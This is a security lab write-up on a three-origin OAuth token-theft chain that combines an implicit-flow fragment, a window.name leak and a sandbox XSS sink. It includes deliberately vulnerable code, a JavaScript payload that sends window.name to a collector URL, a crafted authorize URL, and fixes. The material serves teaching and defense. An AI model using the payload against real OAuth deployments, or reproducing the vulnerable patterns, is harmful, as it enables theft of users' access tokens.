Multi-Origin OAuth Dirty Dancing: Token Theft via window.name + Sandbox XSS

Realistic 3-origin lab · Inspired by Frans Rosen's "dirty dancing in OAuth" pattern

The pattern

Three origins. An OAuth provider on one, a main app on another, a "sandbox" iframe on a third. A well-intentioned dev uses iframe.name to hand context (URL, referrer) to the sandbox. The sandbox has an XSS sink. The OAuth flow keeps the token in the fragment even when the app rejects the state. The attacker chains all four into zero-interaction token theft.

The Three Origins

  • Main app: localhost:3000 — where you sign in, the OAuth callback lives here
  • OAuth IdP: localhost:4000 — completely separate origin, own cookie
  • Sandbox: localhost:5000 — where the analytics iframe loads from

The Bugs

Bug A — Implicit flow leaves the token in the URL

// IdP redirect on response_type=token:
location = redirect_uri + '#access_token=eyJ...&state=...';

The access_token lives in the URL fragment. Anyone who can read location.href on the callback origin can read the token.

Bug B — Callback doesn't strip the fragment on invalid state

// /dd/callback:
if (gotState !== expectedState) {
  showError();
  // URL is NOT cleared. location.hash still contains the token.
}
// Load analytics iframe either way...

Bug C — Main app passes sensitive context into iframe.name

// Inside the callback page:
var iframe = document.getElementById('analytics-frame');
iframe.name = JSON.stringify({ href: location.href, referrer: document.referrer });
iframe.src = 'http://localhost:5000/embed?src=' + encodeURIComponent(telemetrySrc);

The iframe's name is a cross-origin channel: what the parent sets becomes window.name inside the iframe. So whatever JS runs in the sandbox iframe gets to read the victim's full URL — including the token.

Bug D — Sandbox has an XSS sink

// /embed on :5000:
res.send('<script>' + req.query.src + '</script>');

Anything in ?src= executes. The main app passes telemetry from its own URL into ?src=. The attacker controls it.

The Chain

Attack flow

1

Victim is already signed in to the IdP (separate origin — normal single sign-on state).

↓
2

Attacker sends victim a crafted link that opens the IdP's /authorize in a popup with:
response_type=token (implicit) · redirect_uri=/dd/callback?state=bad&telemetry=<attacker JS> · state=...

↓
3

IdP auto-approves (victim is logged in), redirects to /dd/callback?state=bad&telemetry=...#access_token=eyJ....

↓
4

Callback JS sees state mismatch, shows error. Does NOT clear the URL. Runs the analytics iframe setup.

↓
5

Callback sets iframe.name = JSON.stringify(...). The iframe's window.name now contains the access token inside href.

↓
6

Callback loads localhost:5000/embed?src=<attacker JS>. Attacker's JS executes in the sandbox origin.

↓
7

Attacker JS reads window.name → exfils to /dd/collect?data=....

↓
8

Attacker polls the collector, parses the token, calls the API as the victim.

The payload

// Attacker's telemetry JS (embedded into ?src= of the sandbox /embed)
try {
  var payload = window.name;
  var img = new Image();
  img.src = 'http://localhost:3000/dd/collect?data=' + encodeURIComponent(payload);
} catch(e) {}

The malicious URL

http://localhost:4000/authorize?client_id=dash
  &response_type=token
  &redirect_uri=http%3A%2F%2Flocalhost%3A3000%2Fdd%2Fcallback%3Fstate%3Dbad_state
       %26telemetry%3D<URL-encoded JS payload>
  &state=victim_session
  &scope=read

Why each bug matters

Isolated severity

None of the bugs is critical alone:

  • Implicit flow in the fragment — deprecated but common; Low/Medium
  • Callback doesn't clean the fragment — Informational
  • iframe.name leaking the URL to the sandbox — the "design choice" nobody questions
  • Sandbox XSS — Medium, but "isolated" because it's on a different origin

Chained together they yield one-click token theft. That's the whole point of dirty dancing — stitching together behaviors that are each individually defensible.

Run the lab

  1. Start the server: node server.js
  2. Open http://localhost:3000/labs/chains/dd-multi-origin.html
  3. Click "Open IdP login" once (puts cookie on localhost:4000).
  4. Click "Fire exploit (open popup)".
  5. The collector panel fills with the stolen URL + token within ~1 second.

How to fix

  • Authorization code flow with PKCE (no token in fragment)
  • history.replaceState(null, '', location.pathname) on callback load to strip hash
  • Never pass sensitive context into iframe.name. Use postMessage with an allow-list origin.
  • Sandbox /embed must never execute arbitrary src. Serve only a fixed, signed analytics bundle.
  • Pin the sandbox iframe with sandbox="allow-scripts" without allow-same-origin, which breaks most window.name leaks too.

Practice

Open the lab, inspect the callback's HTML source, build the payload yourself, then use the attacker control panel to verify.
